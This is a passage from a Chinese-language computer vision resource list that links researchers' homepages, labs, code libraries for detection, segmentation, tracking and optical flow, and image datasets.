(119)计算机视觉分类信息导航：http://www.visionbib.com/ (120)西班牙马德里理工大学博士Marcos Nieto：http://marcosnieto.net/ (121)香港理工大学副教授张磊：http://www4.comp.polyu.edu.hk/~cslzhang/ (122)以色列技术学院教授Michael Elad：http://www.cs.technion.ac.il/~elad/ (123)韩国启明大学计算机视觉与模式识别实验室：http://cvpr.kmu.ac.kr/ (124)英国诺丁汉大学Michel Valstar博士：http://www.cs.nott.ac.uk/~mfv/ (125)卡内基梅隆大学Takeo Kanade教授:http://www.ri.cmu.edu/people/kanade_takeo.html (126)微软学术搜索：http://libra.msra.cn/ (127)比利时天主教鲁汶大学Radu Timofte博士：http://homes.esat.kuleuven.be/~rtimofte/，交通标志检测，定位，3D跟踪 (128)迪斯尼匹兹堡研究院研究员：Iain Matthews:http://www.iainm.com/iainm/Home.html http://www.ri.cmu.edu/person.html?type=publications&amp;person_id=741&nbsp;AAM,三维重建 （129）康奈尔大学视觉与图像分析组：http://www.via.cornell.edu/ 医学图像处理 （130）密西根州立大学生物识别研究组：http://www.cse.msu.edu/biometrics/ 人脸识别、指纹识别、图像检索（131）柏林科技大学计算机视觉与遥感实验室：http://www.cv.tu-berlin.de/menue/computer_vision_remote_sensing/parameter/en/ 图像分析、物体重建、基于图像的表面测量、医学图像处理 （132）英国布里斯托大学数字多媒体研究组：http://www.cs.bris.ac.uk/Research/Digitalmedia/ 运动检测与跟踪、视频压缩、3D重建、字符定位 （133）英国萨利大学视觉、语音与信号处理中心： http://www.surrey.ac.uk/cvssp/ &nbsp; 人脸识别、监控、3D、视频检索、（134）北卡莱罗纳大学教堂山分校Marc Pollefeys教授：http://www.cs.unc.edu/~marc/ 基于视频的3D模型生成、相机标定、运动检测与分析、3D重建 （135）澳大利亚国立大学Richard Hartley教授：http://users.cecs.anu.edu.au/~hartley/ 运动估计、稀疏子空间、跟踪、 （136）百度技术副总监于凯：http://www.dbs.ifi.lmu.de/~yu_k/ 深度学习，稀疏表示，图像分类 （137）西安电子科技大学高新波教授：http://web.xidian.edu.cn/xbgao/index.html&nbsp;质量评判、水印、稀疏表示、超分辨率 （138）加州大学伯克利分校Michael I.Jordan教授：http://www.cs.berkeley.edu/~jordan/ 机器学习 （139）加州理工行人检测相关资料：http://www.vision.caltech.edu/Image_Datasets/CaltechPedestrians/ （140）微软Redmond研究院研究员Piotr Dollar:&nbsp;http://vision.ucsd.edu/~pdollar/ 行人检测、特征提取、 （141）视觉计算研究论坛：http://www.sigvc.org/bbs/ 中科院视觉计算研究小组的论坛 （142）美国坦桑尼亚州立大学稀疏学习软件包：http://www.public.asu.edu/~jye02/Software/SLEP/index.htm 稀疏学习 （143）美国加州大学圣地亚哥分校Jacob Whitehill博士：http://mplab.ucsd.edu/~jake/ 机器学习 （144）美国布朗大学Michael J.Black教授：http://cs.brown.edu/~black/ &nbsp;人的姿态估计和跟踪 （145）美国加州大学圣地亚哥分校David Kriegman教授：http://cseweb.ucsd.edu/~kriegman/ 人脸识别 （146）南加州大学Paul Debevec教授：http://ict.debevec.org/~debevec/ 或&nbsp;http://www.pauldebevec.com/&nbsp;将CV和CG结合研究&nbsp;人脸捕捉重建技术 （147）伊利诺伊大学D.A.Forsyth教授：http://luthuli.cs.uiuc.edu/~daf/ 三维重建 （148）英国牛津大学Ian Reid教授：http://www.robots.ox.ac.uk/~ian/&nbsp;跟踪和机器人导航 （149）CMU大学Alyosha Efros 教授:&nbsp;https://www.cs.cmu.edu/~efros/ 图像纹理合成 （150）加州大学伯克利分校Jitendra Malik教授：http://www.cs.berkeley.edu/~malik/&nbsp;轮廓检测、图像/视频分割、图形匹配、目标识别 （151）MIT教授William Freeman：&nbsp;http://people.csail.mit.edu/billf/ 图像纹理合成 （152）CMU博士Henry Schneiderman：&nbsp;http://www.cs.cmu.edu/~hws/&nbsp;目标检测和识别； （153）微软研究员Paul Viola:&nbsp;http://research.microsoft.com/en-us/um/people/viola/ AdaBoost算法 （154）微软研究员Antonio Criminisi:&nbsp;http://research.microsoft.com/en-us/people/antcrim/ 图像修补，三维重建，目标检测与跟踪； （155）魏茨曼科学研究所教授Michal Irani:&nbsp;http://www.wisdom.weizmann.ac.il/~irani/ 超分辨率 （156）瑞士洛桑理工学院Pascal Fua教授：http://people.epfl.ch/pascal.fua/bio?lang=en 立体视觉，增强现实 （157）佐治亚理工学院Irfan Essa教授：http://www.ic.gatech.edu/people/irfan-essa 人脸表情识别 （158）中科院助理教授樊彬：http://www.sigvc.org/bfan/ 特征描述； （159）斯坦福大学Sebastian Thrun教授：http://robots.stanford.edu/index.html&nbsp;机器人； （160）多伦多大学Geoffrey E.Hinton教授：http://www.cs.toronto.edu/~hinton/&nbsp;深度学习 （161）凤巢系统架构师张栋博士：http://weibo.com/machinelearning （162）2012年龙星计划机器学习课程：http://bigeye.au.tsinghua.edu.cn/DragonStar2012/index.html （163）中科院自动化所肖柏华教授：http://www.compsys.ia.ac.cn/people/xiaobaihua.html&nbsp;文字识别、人脸识别、质量评判 （164）图像视频质量评判：http://live.ece.utexas.edu/research/quality/ （165）纽约大学Yann LeCun教授http://yann.lecun.com/&nbsp; &nbsp;http://yann.lecun.com/exdb/mnist/&nbsp; 手写体数字识别 （166）二维条码识别开源库zxing：http://code.google.com/p/zxing/ （167）布朗大学Pedro Felzenszwalb教授：http://cs.brown.edu/~pff/&nbsp;特征提取，Deformable Part Model （168）伊利诺伊香槟大学Svetlana Lazebnik教授：http://www.cs.illinois.edu/homes/slazebni/&nbsp;特征提取，聚类，图像检索 （169）荷兰乌德勒支大学图像与多媒体研究中心http://www.cs.uu.nl/centers/give/multimedia/index.html&nbsp;图像、多媒体检索与匹配 （170）英国格拉斯哥大学信息检索小组：http://ir.dcs.gla.ac.uk/&nbsp;文本、图像、视频检索 （171）中科院自动化所孙哲南助理教书：http://www.cbsr.ia.ac.cn/users/znsun/&nbsp;虹膜识别、掌纹识别、人脸识别 （172）南京信息工程大学刘青山教授：http://www.jstuoke.com/web/xky/detail.asp?NewsID=1096&nbsp;人脸图像分析、医学图像分析 （173）清华大学助理教授冯建江：http://ivg.au.tsinghua.edu.cn/~jfeng/&nbsp;指纹识别 （174）北航助理教授黄迪：http://irip.buaa.edu.cn/~dihuang/&nbsp;3D人脸识别 （175）中山大学助理教授郑伟诗：http://sist.sysu.edu.cn/~zhwshi/&nbsp;人脸识别、特征匹配、聚类、检索； （176）google瑞士苏黎世的工程师Thomas Deselaers:&nbsp;http://thomas.deselaers.de/index.html&nbsp;图像检索 （177）百度深度学习研究中心博士后余轶南：http://www.cbsr.ia.ac.cn/users/ynyu/index.htm&nbsp;目标检测，图像检索 （178）威兹曼科技大学超分辨率：http://www.wisdom.weizmann.ac.il/~vision/SingleImageSR.html （179）德克萨斯大学奥斯汀分校Al Bovik教授：http://live.ece.utexas.edu/people/bovik/&nbsp;图像视频质量判别、特征提取 （180）以色列希伯来大学Yair Weiss教授：http://www.cs.huji.ac.il/~yweiss/&nbsp;机器学习、超分辨率 （181）以色列希伯来大学Daniel Zoran博士：http://www.cs.huji.ac.il/~daniez/&nbsp;超分辨率、去噪 （182）美国加州大学Peyman Milanfar教授：http://users.soe.ucsc.edu/~milanfar/&nbsp;去噪 （183）中科院计算所副研究员常虹：http://www.jdl.ac.cn/user/hchang/index.html&nbsp;图像检索、半监督学习、超分辨率 （184）以色列威茨曼大学Anat Levin教授：http://www.wisdom.weizmann.ac.il/~levina/&nbsp;去噪、去模糊 （185）以色列威茨曼大学Daniel Glasner博士后：http://www.wisdom.weizmann.ac.il/~glasner/&nbsp;超分辨率、分割、姿态估计 （186）密西根大学助理教授Honglak Lee:&nbsp;http://web.eecs.umich.edu/~honglak/&nbsp;机器学习、特征提取，去噪、稀疏表示； （187）MIT周博磊博士：http://people.csail.mit.edu/bzhou/&nbsp;聚集分析、运动检测 （188）美国田纳西大学Li He博士：http://web.eecs.utk.edu/~lhe4/&nbsp;稀疏表示、超分辨率； （189）Adobe研究院Jianchao Yang研究员：http://www.ifp.illinois.edu/~jyang29/&nbsp;稀疏表示，超分辨率、图片检索、去噪、去模糊 （190）Deep Learning主页：http://deeplearning.net/&nbsp;深度学习论文、软件，代码，demo，数据等； （191）斯坦福大学Andrew Ng教授：http://cs.stanford.edu/people/ang/&nbsp;深度神经网络，深度学习 （192）Elefant:&nbsp;http://elefant.developer.nicta.com.au/&nbsp;机器学习开源库 （193）微软研究员Ce Liu:&nbsp;http://people.csail.mit.edu/celiu/&nbsp;去噪、超分辨率、去模糊、分割 （194）West Virginia大学助理教授Xin Li:&nbsp;http://www.csee.wvu.edu/~xinl/&nbsp;边缘检测、降噪、去模糊 （195）http://www.csee.wvu.edu/~xinl/source.html&nbsp;深度学习、去噪、编码、压缩感知、超分辨率、聚类、分割等相关代码集合 （196）西班牙格拉纳达大学超分辨率重建项目组：http://decsai.ugr.es/pi/superresolution/index.html （197）清华大学程明明博士：http://mmcheng.net/&nbsp;图像分割、检索 （198）牛津布鲁克斯大学Philip H.S.Torr教授：http://cms.brookes.ac.uk/staff/PhilipTorr/&nbsp;分割、三维重建 （199）佐治亚理工学院James M.Rehg教授：http://www.cc.gatech.edu/~rehg/&nbsp;分割、行人检测、特征描述、 （200）大规模图像分类、检测竞赛ILSVRC（Stanford, Google举办）: &nbsp;http://www.image-net.org/challenges/LSVRC/2013/ （201）加州大学尔湾分校Deva Ramanan助理教授：http://www.ics.uci.edu/~dramanan/&nbsp;目标检测，行人检测，跟踪、稀疏表示 （202）人脸识别测试图片集：http://www.mlcv.net/ （203）美国西北大学博士Ming Yang:&nbsp;http://www.ece.northwestern.edu/~mya671/ 人脸识别、图像检索； （204）美国加州大学伯克利分校博士后Ross B.Girshick：http://www.cs.berkeley.edu/~rbg/ 目标检测（DPM） （205）中文语言资源联盟：http://www.chineseldc.org/index.html &nbsp;内有很多语言识别、字符识别的训练，测试库； （206）西班牙巴塞罗那大学计算机视觉中心：http://www.cvc.uab.es/adas/site/ 检测、跟踪、3D、行人检测、汽车辅助驾驶 （207）德国戴姆勒研究所Prof. Dr. Dariu M. Gavrila：http://www.gavrila.net/index.html 跟踪、行人检测、 （208）苏黎世联邦理工学院Andreas Ess博士后：http://www.vision.ee.ethz.ch/~aess/ 行人检测、行为检测、跟踪 （209）Libqrencode:&nbsp;http://fukuchi.org/works/qrencode/ 基于C语言的QR二维码编码开源库 （210）江西财经大学袁飞牛教授：http://sit.jxufe.cn/grbk/yfn/index.html# &nbsp;烟雾检测、3D重建、医学图像处理 （211）耶路撒冷大学Raanan Fattal教师：http://www.cs.huji.ac.il/~raananf/ &nbsp;图像增强、 （212）耶路撒冷大学Dani Lischnski教授：http://www.cs.huji.ac.il/~danix/ 去模糊、纹理合成、图像增强 3 代码汇总 &nbsp; 一、特征提取Feature Extraction： SIFT [1] [Demo program][SIFT Library] [VLFeat] PCA-SIFT [2] [Project] Affine-SIFT [3] [Project] SURF [4] [OpenSURF] [Matlab Wrapper] Affine Covariant Features [5] [Oxford project] MSER [6] [Oxford project] [VLFeat] Geometric Blur [7] [Code] Local Self-Similarity Descriptor [8] [Oxford implementation] Global and Efficient Self-Similarity [9] [Code] Histogram of Oriented Graidents [10] [INRIA Object Localization Toolkit] [OLT toolkit for Windows] GIST [11] [Project] Shape Context [12] [Project] Color Descriptor [13] [Project] Pyramids of Histograms of Oriented Gradients [Code] Space-Time Interest Points (STIP) [14][Project] [Code] Boundary Preserving Dense Local Regions [15][Project] Weighted Histogram[Code] Histogram-based Interest Points Detectors[Paper][Code] An OpenCV - C++ implementation of Local Self Similarity Descriptors [Project] Fast Sparse Representation with Prototypes[Project] Corner Detection [Project] AGAST Corner Detector: faster than FAST and even FAST-ER[Project] Real-time Facial Feature Detection using Conditional Regression Forests[Project] Global and Efficient Self-Similarity for Object Classification and Detection[code] WαSH: Weighted α-Shapes for Local Feature Detection[Project] HOG[Project] Online Selection of Discriminative Tracking Features[Project] 二、图像分割Image Segmentation： Normalized Cut [1] [Matlab code] Gerg Mori’ Superpixel code [2] [Matlab code] Efficient Graph-based Image Segmentation [3] [C++ code] [Matlab wrapper] Mean-Shift Image Segmentation [4] [EDISON C++ code] [Matlab wrapper] OWT-UCM Hierarchical Segmentation [5] [Resources] Turbepixels [6] [Matlab code 32bit] [Matlab code 64bit] [Updated code] Quick-Shift [7] [VLFeat] SLIC Superpixels [8] [Project] Segmentation by Minimum Code Length [9] [Project] Biased Normalized Cut [10] [Project] Segmentation Tree [11-12] [Project] Entropy Rate Superpixel Segmentation [13] [Code] Fast Approximate Energy Minimization via Graph Cuts[Paper][Code] Efﬁcient Planar Graph Cuts with Applications in Computer Vision[Paper][Code] Isoperimetric Graph Partitioning for Image Segmentation[Paper][Code] Random Walks for Image Segmentation[Paper][Code] Blossom V: A new implementation of a minimum cost perfect matching algorithm[Code] An Experimental Comparison of Min-Cut/Max-Flow Algorithms for Energy Minimization in Computer Vision[Paper][Code] Geodesic Star Convexity for Interactive Image Segmentation[Project] Contour Detection and Image Segmentation Resources[Project][Code] Biased Normalized Cuts[Project] Max-flow/min-cut[Project] Chan-Vese Segmentation using Level Set[Project] A Toolbox of Level Set Methods[Project] Re-initialization Free Level Set Evolution via Reaction Diffusion[Project] Improved C-V active contour model[Paper][Code] A Variational Multiphase Level Set Approach to Simultaneous Segmentation and Bias Correction[Paper][Code] Level Set Method Research by Chunming Li[Project] ClassCut for Unsupervised Class Segmentation[code] SEEDS: Superpixels Extracted via Energy-Driven Sampling&nbsp;[Project][other] 三、目标检测Object Detection： A simple object detector with boosting [Project] INRIA Object Detection and Localization Toolkit [1] [Project] Discriminatively Trained Deformable Part Models [2] [Project] Cascade Object Detection with Deformable Part Models [3] [Project] Poselet [4] [Project] Implicit Shape Model [5] [Project] Viola and Jones’s Face Detection [6] [Project] Bayesian Modelling of Dyanmic Scenes for Object Detection[Paper][Code] Hand detection using multiple proposals[Project] Color Constancy, Intrinsic Images, and Shape Estimation[Paper][Code] Discriminatively trained deformable part models[Project] Gradient Response Maps for Real-Time Detection of Texture-Less Objects: LineMOD [Project] Image Processing On Line[Project] Robust Optical Flow Estimation[Project] Where's Waldo: Matching People in Images of Crowds[Project] Scalable Multi-class Object Detection[Project] Class-Specific Hough Forests for Object Detection[Project] Deformed Lattice Detection In Real-World Images[Project] Discriminatively trained deformable part models[Project] 四、显著性检测Saliency Detection： Itti, Koch, and Niebur’ saliency detection [1] [Matlab code] Frequency-tuned salient region detection [2] [Project] Saliency detection using maximum symmetric surround [3] [Project] Attention via Information Maximization [4] [Matlab code] Context-aware saliency detection [5] [Matlab code] Graph-based visual saliency [6] [Matlab code] Saliency detection: A spectral residual approach. [7] [Matlab code] Segmenting salient objects from images and videos. [8] [Matlab code] Saliency Using Natural statistics. [9] [Matlab code] Discriminant Saliency for Visual Recognition from Cluttered Scenes. [10] [Code] Learning to Predict Where Humans Look [11] [Project] Global Contrast based Salient Region Detection [12] [Project] Bayesian Saliency via Low and Mid Level Cues[Project] Top-Down Visual Saliency via Joint CRF and Dictionary Learning[Paper][Code] Saliency Detection: A Spectral Residual Approach[Code] 五、图像分类、聚类Image Classification, Clustering Pyramid Match [1] [Project] Spatial Pyramid Matching [2] [Code] Locality-constrained Linear Coding [3] [Project] [Matlab code] Sparse Coding [4] [Project] [Matlab code] Texture Classification [5] [Project] Multiple Kernels for Image Classification [6] [Project] Feature Combination [7] [Project] SuperParsing [Code] Large Scale Correlation Clustering Optimization[Matlab code] Detecting and Sketching the Common[Project] Self-Tuning Spectral Clustering[Project][Code] User Assisted Separation of Reflections from a Single Image Using a Sparsity Prior[Paper][Code] Filters for Texture Classification[Project] Multiple Kernel Learning for Image Classification[Project] SLIC Superpixels[Project] 六、抠图Image Matting A Closed Form Solution to Natural Image Matting [Code] Spectral Matting [Project] Learning-based Matting [Code] 七、目标跟踪Object Tracking： A Forest of Sensors - Tracking Adaptive Background Mixture Models [Project] Object Tracking via Partial Least Squares Analysis[Paper][Code] Robust Object Tracking with Online Multiple Instance Learning[Paper][Code] Online Visual Tracking with Histograms and Articulating Blocks[Project] Incremental Learning for Robust Visual Tracking[Project] Real-time Compressive Tracking[Project] Robust Object Tracking via Sparsity-based Collaborative Model[Project] Visual Tracking via Adaptive Structural Local Sparse Appearance Model[Project] Online Discriminative Object Tracking with Local Sparse Representation[Paper][Code] Superpixel Tracking[Project] Learning Hierarchical Image Representation with Sparsity, Saliency and Locality[Paper][Code] Online Multiple Support Instance Tracking [Paper][Code] Visual Tracking with Online Multiple Instance Learning[Project] Object detection and recognition[Project] Compressive Sensing Resources[Project] Robust Real-Time Visual Tracking using Pixel-Wise Posteriors[Project] Tracking-Learning-Detection[Project][OpenTLD/C++ Code] the HandVu：vision-based hand gesture interface[Project] Learning Probabilistic Non-Linear Latent Variable Models for Tracking Complex Activities[Project] 八、Kinect： Kinect toolbox[Project] OpenNI[Project] zouxy09 CSDN Blog[Resource] FingerTracker 手指跟踪[code] 九、3D相关： 3D Reconstruction of a Moving Object[Paper] [Code] Shape From Shading Using Linear Approximation[Code] Combining Shape from Shading and Stereo Depth Maps[Project][Code] Shape from Shading: A Survey[Paper][Code] A Spatio-Temporal Descriptor based on 3D Gradients [HOG3D][Project](Code) Multi-camera Scene Reconstruction via Graph Cuts[Paper][Code] A Fast Marching Formulation of Perspective Shape from Shading under Frontal Illumination[Paper][Code] Reconstruction:3D Shape, Illumination, Shading, Reflectance, Texture[Project] Monocular Tracking of 3D Human Motion with a Coordinated Mixture of Factor Analyzers[Code] Learning 3-D Scene Structure from a Single Still Image[Project] 十、机器学习算法： Matlab class for computing Approximate Nearest Nieghbor (ANN) [Matlab class&nbsp;providing interface toANN library] Random Sampling[code] Probabilistic Latent Semantic Analysis [pLSA](Code) FASTANN and FASTCLUSTER for approximate k-means [AKM](Project) Fast Intersection / Additive Kernel SVMs[Project] SVM[Code] Ensemble learning[Project] Deep Learning[Net] Deep Learning Methods for Vision[Project] Neural Network for Recognition of Handwritten Digits[Project] Training a deep autoencoder or a classifier on MNIST digits[Project] THE MNIST DATABASE of handwritten digits[Project] Ersatz：deep neural networks in the cloud[Project] Deep Learning [Project] sparseLM : Sparse Levenberg-Marquardt nonlinear least squares in C/C++[Project] Weka 3: Data Mining Software in Java[Project] Invited talk \"A Tutorial on Deep Learning\" by Dr. Kai Yu [余凯](Video) CNN - Convolutional neural network class[Matlab Tool] Yann LeCun's Publications[Wedsite] LeNet-5, convolutional neural networks[Project] Training a deep autoencoder or a classifier on MNIST digits[Project] Deep Learning 大牛Geoffrey E. Hinton's HomePage[Website] Multiple Instance Logistic Discriminant-based Metric Learning (MildML) and Logistic Discriminant-based Metric Learning [LDML](Code) Sparse coding simulation software[Project] Visual Recognition and Machine Learning Summer School[Software] 十一、目标、行为识别Object, Action Recognition： Action Recognition by Dense Trajectories[Project][Code] Action Recognition Using a Distributed Representation of Pose and Appearance[Project] Recognition Using Regions[Paper][Code] 2D Articulated Human Pose Estimation[Project] Fast Human Pose Estimation Using Appearance and Motion via Multi-Dimensional Boosting Regression[Paper][Code] Estimating Human Pose from Occluded Images[Paper][Code] Quasi-dense wide baseline matching[Project] ChaLearn Gesture Challenge: Principal motion: PCA-based reconstruction of motion histograms[Project] Real Time Head Pose Estimation with Random Regression Forests[Project] 2D Action Recognition Serves 3D Human Pose Estimation[ A Hough Transform-Based Voting Framework for Action Recognition[ Motion Interchange Patterns for Action Recognition in Unconstrained Videos[ 2D articulated human pose estimation software[Project] Learning and detecting shape models [code] Progressive Search Space Reduction for Human Pose Estimation[Project] Learning Non-Rigid 3D Shape from 2D Motion[Project] 十二、图像处理： Distance Transforms of Sampled Functions[Project] The Computer Vision Homepage[Project] Efficient appearance distances between windows[code] Image Exploration algorithm[code] Motion Magnification 运动放大 [Project] Bilateral Filtering for Gray and Color Images 双边滤波器 [Project] A Fast Approximation of the Bilateral Filter using a Signal Processing Approach [ 十三、一些实用工具： EGT: a Toolbox for Multiple View Geometry and Visual Servoing[Project] [Code] a development kit of matlab mex functions for OpenCV library[Project] Fast Artificial Neural Network Library[Project] 十四、人手及指尖检测与识别： finger-detection-and-gesture-recognition [Code] Hand and Finger Detection using JavaCV[Project] Hand and fingers detection[Code] 十五、场景解释： Nonparametric Scene Parsing via Label Transfer [Project] 十六、光流Optical flow： High accuracy optical flow using a theory for warping [Project] Dense Trajectories Video Description [Project] SIFT Flow: Dense Correspondence across Scenes and its Applications[Project] KLT: An Implementation of the Kanade-Lucas-Tomasi Feature Tracker [Project] Tracking Cars Using Optical Flow[Project] Secrets of optical flow estimation and their principles[Project] implmentation of the Black and Anandan dense optical flow method[Project] Optical Flow Computation[Project] Beyond Pixels: Exploring New Representations and Applications for Motion Analysis[Project] A Database and Evaluation Methodology for Optical Flow[Project] optical flow relative[Project] Robust Optical Flow Estimation [Project] optical flow[Project] 十七、图像检索Image Retrieval： Semi-Supervised Distance Metric Learning for Collaborative Image Retrieval&nbsp;[Paper][code] 十八、马尔科夫随机场Markov Random Fields： Markov Random Fields for Super-Resolution&nbsp;[Project] A Comparative Study of Energy Minimization Methods for Markov Random Fields with Smoothness-Based Priors [Project] 十九、运动检测Motion detection： Moving Object Extraction, Using Models or Analysis of Regions&nbsp;[Project] Background Subtraction: Experiments and Improvements for ViBe [Project] A Self-Organizing Approach to Background Subtraction for Visual Surveillance Applications [Project] changedetection.net: A new change detection benchmark dataset[Project] ViBe - a powerful technique for background detection and subtraction in video sequences[Project] Background Subtraction Program[Project] Motion Detection Algorithms[Project] Stuttgart Artificial Background Subtraction Dataset[Project] Object Detection, Motion Estimation, and Tracking[Project] &nbsp; Feature Detection and Description General Libraries: VLFeat&nbsp;– Implementation of various feature descriptors (including SIFT, HOG, and LBP) and covariant feature detectors (including DoG, Hessian, Harris Laplace, Hessian Laplace, Multiscale Hessian, Multiscale Harris). Easy-to-use Matlab interface. See&nbsp;Modern features: Software&nbsp;– Slides providing a demonstration of VLFeat and also links to other software. Check also&nbsp;VLFeat hands-on session training OpenCV&nbsp;– Various implementations of modern feature detectors and descriptors (SIFT, SURF, FAST, BRIEF, ORB, FREAK, etc.) Fast Keypoint Detectors for Real-time Applications: FAST&nbsp;– High-speed corner detector implementation for a wide variety of platforms AGAST&nbsp;– Even faster than the FAST corner detector. A multi-scale version of this method is used for the BRISK descriptor (ECCV 2010). Binary Descriptors for Real-Time Applications: BRIEF&nbsp;– C++ code for a fast and accurate interest point descriptor (not invariant to rotations and scale) (ECCV 2010) ORB&nbsp;– OpenCV implementation of the Oriented-Brief (ORB) descriptor (invariant to rotations, but not scale) BRISK&nbsp;– Efficient Binary descriptor invariant to rotations and scale. It includes a Matlab mex interface. (ICCV 2011) FREAK&nbsp;– Faster than BRISK (invariant to rotations and scale) (CVPR 2012) SIFT and SURF Implementations: SIFT:&nbsp;VLFeat,&nbsp;OpenCV,&nbsp;Original code&nbsp;by David Lowe,&nbsp;GPU implementation,&nbsp;OpenSIFT SURF:&nbsp;Herbert Bay’s code,&nbsp;OpenCV,&nbsp;GPU-SURF Other Local Feature Detectors and Descriptors: VGG Affine Covariant features&nbsp;– Oxford code for various affine covariant feature detectors and descriptors. LIOP descriptor&nbsp;– Source code for the Local Intensity order Pattern (LIOP) descriptor (ICCV 2011). Local Symmetry Features&nbsp;– Source code for matching of local symmetry features under large variations in lighting, age, and rendering style (CVPR 2012). Global Image Descriptors: GIST&nbsp;– Matlab code for the GIST descriptor CENTRIST&nbsp;– Global visual descriptor for scene categorization and object detection (PAMI 2011) &nbsp; Feature Coding and Pooling VGG Feature Encoding Toolkit&nbsp;– Source code for various state-of-the-art feature encoding methods – including Standard hard encoding, Kernel codebook encoding, Locality-constrained linear encoding, and Fisher kernel encoding. Spatial Pyramid Matching&nbsp;– Source code for feature pooling based on spatial pyramid matching (widely used for image classification) &nbsp; Convolutional Nets and Deep Learning EBLearn&nbsp;– C++ Library for Energy-Based Learning. It includes several demos and step-by-step instructions to train classifiers based on convolutional neural networks. Torch7&nbsp;– Provides a matlab-like environment for state-of-the-art machine learning algorithms, including a fast implementation of convolutional neural networks. Deep Learning&nbsp;- Various links for deep learning software. &nbsp; Part-Based Models &nbsp; Deformable Part-based Detector&nbsp;– Library provided by the authors of the original paper (state-of-the-art in PASCAL VOC detection task) Efficient Deformable Part-Based Detector&nbsp;– Branch-and-Bound implementation for a deformable part-based detector. Accelerated Deformable Part Model&nbsp;– Efficient implementation of a method that achieves the exact same performance of deformable part-based detectors but with significant acceleration (ECCV 2012). Coarse-to-Fine Deformable Part Model&nbsp;– Fast approach for deformable object detection (CVPR 2011). Poselets&nbsp;– C++ and Matlab versions for object detection based on poselets. Part-based Face Detector and Pose Estimation&nbsp;– Implementation of a unified approach for face detection, pose estimation, and landmark localization (CVPR 2012). &nbsp; Attributes and Semantic Features Relative Attributes&nbsp;– Modified implementation of RankSVM to train Relative Attributes (ICCV 2011). Object Bank&nbsp;– Implementation of object bank semantic features (NIPS 2010). See also&nbsp;ActionBank Classemes, Picodes, and Meta-class features&nbsp;– Software for extracting high-level image descriptors (ECCV 2010, NIPS 2011, CVPR 2012). Large-Scale Learning Additive Kernels&nbsp;– Source code for fast additive kernel SVM classifiers (PAMI 2013). LIBLINEAR&nbsp;– Library for large-scale linear SVM classification. VLFeat&nbsp;– Implementation for Pegasos SVM and Homogeneous Kernel map. Fast Indexing and Image Retrieval FLANN&nbsp;– Library for performing fast approximate nearest neighbor. Kernelized LSH&nbsp;– Source code for Kernelized Locality-Sensitive Hashing (ICCV 2009). ITQ Binary codes&nbsp;– Code for generation of small binary codes using Iterative Quantization and other baselines such as Locality-Sensitive-Hashing (CVPR 2011). INRIA Image Retrieval&nbsp;– Efficient code for state-of-the-art large-scale image retrieval (CVPR 2011). Object Detection See&nbsp;Part-based Models&nbsp;and&nbsp;Convolutional Nets&nbsp;above. Pedestrian Detection at 100fps&nbsp;– Very fast and accurate pedestrian detector (CVPR 2012). Caltech Pedestrian Detection Benchmark&nbsp;– Excellent resource for pedestrian detection, with various links for state-of-the-art implementations. OpenCV&nbsp;– Enhanced implementation of Viola&amp;Jones real-time object detector, with trained models for face detection. Efficient Subwindow Search&nbsp;– Source code for branch-and-bound optimization for efficient object localization (CVPR 2008). 3D Recognition Point-Cloud Library&nbsp;– Library for 3D image and point cloud processing. Action Recognition ActionBank&nbsp;– Source code for action recognition based on the ActionBank representation (CVPR 2012). STIP Features&nbsp;– software for computing space-time interest point descriptors Independent Subspace Analysis&nbsp;– Look for Stacked ISA for Videos (CVPR 2011) Velocity Histories of Tracked Keypoints&nbsp;- C++ code for activity recognition using the velocity histories of tracked keypoints (ICCV 2009) Datasets Attributes Animals with Attributes&nbsp;– 30,475 images of 50 animals classes with 6 pre-extracted feature representations for each image. aYahoo and aPascal&nbsp;– Attribute annotations for images collected from Yahoo and Pascal VOC 2008. FaceTracer&nbsp;– 15,000 faces annotated with 10 attributes and fiducial points. PubFig&nbsp;– 58,797 face images of 200 people with 73 attribute classifier outputs. [url=http://vis-www.cs.umass.edu/lfw/]LFW[/url]&nbsp;– 13,233 face images of 5,749 people with 73 attribute classifier outputs. Human Attributes&nbsp;– 8,000 people with annotated attributes. Check also this&nbsp;link&nbsp;for another dataset of human attributes. SUN Attribute Database&nbsp;– Large-scale scene attribute database with a taxonomy of 102 attributes. ImageNet Attributes&nbsp;– Variety of attribute labels for the ImageNet dataset. Relative attributes&nbsp;– Data for OSR and a subset of PubFig datasets. Check also this&nbsp;link&nbsp;for the WhittleSearch data. Attribute Discovery Dataset&nbsp;– Images of shopping categories associated with textual descriptions. Fine-grained Visual Categorization Caltech-UCSD Birds Dataset&nbsp;– Hundreds of bird categories with annotated parts and attributes. Stanford Dogs Dataset&nbsp;– 20,000 images of 120 breeds of dogs from around the world. Oxford-IIIT Pet Dataset&nbsp;– 37 category pet dataset with roughly 200 images for each class. Pixel level trimap segmentation is included. Leeds Butterfly Dataset&nbsp;– 832 images of 10 species of butterflies. Oxford Flower Dataset&nbsp;– Hundreds of flower categories. Face Detection [url=http://vis-www.cs.umass.edu/fddb/]FDDB[/url]&nbsp;– UMass face detection dataset and benchmark (5,000+ faces) CMU/MIT&nbsp;– Classical face detection dataset. Face Recognition Face Recognition Homepage&nbsp;– Large collection of face recognition datasets. [url=http://vis-www.cs.umass.edu/lfw/]LFW[/url]&nbsp;– UMass unconstrained face recognition dataset (13,000+ face images). NIST Face Homepage&nbsp;– includes face recognition grand challenge (FRGC), vendor tests (FRVT) and others. CMU Multi-PIE&nbsp;– contains more than 750,000 images of 337 people, with 15 different views and 19 lighting conditions. FERET&nbsp;– Classical face recognition dataset. Deng Cai’s face dataset in Matlab Format&nbsp;– Easy to use if you want play with simple face datasets including Yale, ORL, PIE, and Extended Yale B. SCFace&nbsp;– Low-resolution face dataset captured from surveillance cameras. Handwritten Digits MNIST&nbsp;– large dataset containing a training set of 60,000 examples, and a test set of 10,000 examples. Pedestrian Detection Caltech Pedestrian Detection Benchmark&nbsp;– 10 hours of video taken from a vehicle,350K bounding boxes for about 2.3K unique pedestrians. INRIA Person Dataset&nbsp;– Currently one of the most popular pedestrian detection datasets. ETH Pedestrian Dataset&nbsp;– Urban dataset captured from a stereo rig mounted on a stroller. TUD-Brussels Pedestrian Dataset&nbsp;– Dataset with image pairs recorded in an crowded urban setting with an onboard camera. PASCAL Human Detection&nbsp;– One of 20 categories in PASCAL VOC detection challenges. USC Pedestrian Dataset&nbsp;– Small dataset captured from surveillance cameras. Generic Object Recognition ImageNet&nbsp;– Currently the largest visual recognition dataset in terms of number of categories and images. Tiny Images&nbsp;– 80 million 32x32 low resolution images. Pascal VOC&nbsp;– One of the most influential visual recognition datasets. Caltech 101&nbsp;/&nbsp;Caltech 256&nbsp;– Popular image datasets containing 101 and 256 object categories, respectively. 